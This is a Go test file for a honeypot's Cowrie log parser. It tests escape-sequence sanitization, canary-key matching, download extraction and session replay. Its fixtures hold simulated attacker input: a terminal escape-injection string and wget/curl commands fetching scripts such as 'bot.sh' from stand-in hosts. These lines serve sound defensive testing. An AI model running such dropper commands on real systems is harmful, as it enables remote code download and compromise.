package cowrieparser

import (
	"encoding/binary"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/harris/honeypot/internal/canary"
	honeypotv1 "github.com/harris/honeypot/proto/gen/honeypot/v1"
)

func TestSanitizeTerminalTextStripsEscapeAttacks(t *testing.T) {
	dirty := "\x1b]0;pwned-title\x07\x1bP1$r\x1b\\\x1b[31mcurl\x1b[0m http://evil.example/drop.sh\x00\x7f"
	clean := SanitizeTerminalText(dirty)
	if strings.Contains(clean, "\x1b") || strings.Contains(clean, "pwned-title") || strings.Contains(clean, "\x00") || strings.Contains(clean, "\x7f") {
		t.Fatalf("escape sequences survived sanitization: %q", clean)
	}
	if clean != "curl http://evil.example/drop.sh" {
		t.Fatalf("unexpected sanitized output: %q", clean)
	}
}

func TestCowrieParserSessionReplayAndDownloadExtraction(t *testing.T) {
	pool := canary.NewSensorKeyPool()
	pool.AddSeeds([]*honeypotv1.CanaryKeySeed{
		{
			CanaryKeyId:     "can-1",
			KeyPlaintext:    "sk-proj-canarysecret1234567890",
			ProviderStyle:   "openai",
			PlacementSource: "cowrie_honeyfs",
		},
	})
	p := NewParser("node-1", 22, pool)

	lines := []string{
		`{"eventid":"cowrie.session.connect","timestamp":"2026-11-16T10:00:00Z","session":"sess-a1","src_ip":"198.51.100.10","src_port":55123,"dst_port":22,"protocol":"ssh"}`,
		`{"eventid":"cowrie.client.version","timestamp":"2026-11-16T10:00:00.1Z","session":"sess-a1","version":"SSH-2.0-Go"}`,
		`{"eventid":"cowrie.client.kex","timestamp":"2026-11-16T10:00:00.2Z","session":"sess-a1","hassh":"b12d2871a1189eff20364cf5333619ee"}`,
		`{"eventid":"cowrie.login.success","timestamp":"2026-11-16T10:00:01Z","session":"sess-a1","src_ip":"198.51.100.10","username":"root","password":"toor"}`,
		`{"eventid":"cowrie.command.input","timestamp":"2026-11-16T10:00:02Z","session":"sess-a1","src_ip":"198.51.100.10","input":"\u001b]2;evil\u0007wget http://203.0.113.55/bot.sh -O /tmp/b && echo sk-proj-canarysecret1234567890"}`,
		`{"eventid":"cowrie.session.file_download","timestamp":"2026-11-16T10:00:03Z","session":"sess-a1","src_ip":"198.51.100.10","url":"http://203.0.113.55/bot.sh","outfile":"/var/lib/cowrie/downloads/abc","shasum":"` + strings.Repeat("a", 64) + `"}`,
		`{"eventid":"cowrie.session.closed","timestamp":"2026-11-16T10:00:05Z","session":"sess-a1","duration":5.0}`,
	}

	var downloads []FileDownloadNotice
	var replay *honeypotv1.SshSessionReplay
	var sawCanary bool
	for _, ln := range lines {
		res, err := p.ProcessLine(ln)
		if err != nil {
			t.Fatalf("ProcessLine failed: %v", err)
		}
		downloads = append(downloads, res.Downloads...)
		for _, ev := range res.Events {
			if ev.GetCanaryKeyId() == "can-1" {
				sawCanary = true
			}
		}
		if res.Replay != nil {
			replay = res.Replay
		}
	}

	if !sawCanary {
		t.Fatal("expected canary key match in command telemetry")
	}
	if len(downloads) < 2 {
		t.Fatalf("expected >= 2 download notices (command URL + file_download), got %d", len(downloads))
	}
	if replay == nil {
		t.Fatal("expected SshSessionReplay on cowrie.session.closed")
	}
	if replay.Hassh != "b12d2871a1189eff20364cf5333619ee" || replay.Username != "root" || !replay.AuthSucceeded {
		t.Fatalf("unexpected replay fields: %+v", replay)
	}
	if strings.Contains(replay.AsciicastV2, "evil") && strings.Contains(replay.AsciicastV2, "\x1b]") {
		t.Fatalf("asciicast contains unsanitized OSC sequence: %q", replay.AsciicastV2)
	}

	castLines := strings.Split(strings.TrimSpace(replay.AsciicastV2), "\n")
	if len(castLines) < 2 {
		t.Fatalf("expected asciicast header + event rows, got %d lines", len(castLines))
	}
	var hdr map[string]any
	if err := json.Unmarshal([]byte(castLines[0]), &hdr); err != nil {
		t.Fatalf("invalid asciicast v2 header JSON: %v", err)
	}
	if int(hdr["version"].(float64)) != 2 {
		t.Fatalf("expected asciicast version 2, got %v", hdr["version"])
	}
	if p.ActiveSessions() != 0 {
		t.Fatalf("expected closed session evicted, active=%d", p.ActiveSessions())
	}
}

func appendUMLFrame(buf []byte, op, dir int32, sec, usec uint32, payload string) []byte {
	hdr := make([]byte, 24)
	binary.LittleEndian.PutUint32(hdr[0:4], uint32(op))
	binary.LittleEndian.PutUint32(hdr[4:8], 0)
	binary.LittleEndian.PutUint32(hdr[8:12], uint32(len(payload)))
	binary.LittleEndian.PutUint32(hdr[12:16], uint32(dir))
	binary.LittleEndian.PutUint32(hdr[16:20], sec)
	binary.LittleEndian.PutUint32(hdr[20:24], usec)
	buf = append(buf, hdr...)
	return append(buf, payload...)
}

func TestParseUMLTTYLogAndLogClosedReplay(t *testing.T) {
	baseDir := t.TempDir()
	ttyDir := filepath.Join(baseDir, "var", "lib", "cowrie", "tty")
	if err := os.MkdirAll(ttyDir, 0o755); err != nil {
		t.Fatal(err)
	}

	var uml []byte
	uml = appendUMLFrame(uml, 3, 2, 1794846622, 10000, "root@prod-ai-gw-01:~# nvidia-smi\n")
	uml = appendUMLFrame(uml, 3, 1, 1794846622, 15000, "ignored-input")
	uml = appendUMLFrame(uml, 3, 2, 1794846623, 50000, "| NVIDIA A10G |\n")
	ttyFile := filepath.Join(ttyDir, "abc123")
	if err := os.WriteFile(ttyFile, uml, 0o644); err != nil {
		t.Fatal(err)
	}

	p := NewParser("node-tty", 22, nil)
	p.SetTrapBaseDir(baseDir)

	lines := []string{
		`{"eventid":"cowrie.session.connect","timestamp":"2026-11-16T10:00:00Z","session":"s-tty","src_ip":"198.51.100.8","dst_port":2222,"protocol":"ssh"}`,
		`{"eventid":"cowrie.login.success","timestamp":"2026-11-16T10:00:01Z","session":"s-tty","src_ip":"198.51.100.8","username":"root","password":"x"}`,
		`{"eventid":"cowrie.command.input","timestamp":"2026-11-16T10:00:02Z","session":"s-tty","src_ip":"198.51.100.8","input":"nvidia-smi"}`,
		`{"eventid":"cowrie.log.closed","timestamp":"2026-11-16T10:00:03Z","session":"s-tty","ttylog":"var/lib/cowrie/tty/abc123","duration_ms":2100}`,
		`{"eventid":"cowrie.session.closed","timestamp":"2026-11-16T10:00:03.1Z","session":"s-tty","duration_ms":3100}`,
	}
	var replay *honeypotv1.SshSessionReplay
	for _, ln := range lines {
		res, err := p.ProcessLine(ln)
		if err != nil {
			t.Fatalf("ProcessLine failed: %v", err)
		}
		if res.Replay != nil {
			replay = res.Replay
		}
	}
	if replay == nil {
		t.Fatal("expected SshSessionReplay")
	}
	if !strings.Contains(replay.AsciicastV2, "NVIDIA A10G") {
		t.Fatalf("expected real UML TTY output in asciicast_v2, got %q", replay.AsciicastV2)
	}
	if strings.Contains(replay.AsciicastV2, "ignored-input") {
		t.Fatalf("expected dir=1 raw input excluded when output echo exists")
	}
	if replay.DurationMs != 3100 {
		t.Fatalf("expected duration_ms=3100, got %d", replay.DurationMs)
	}
}
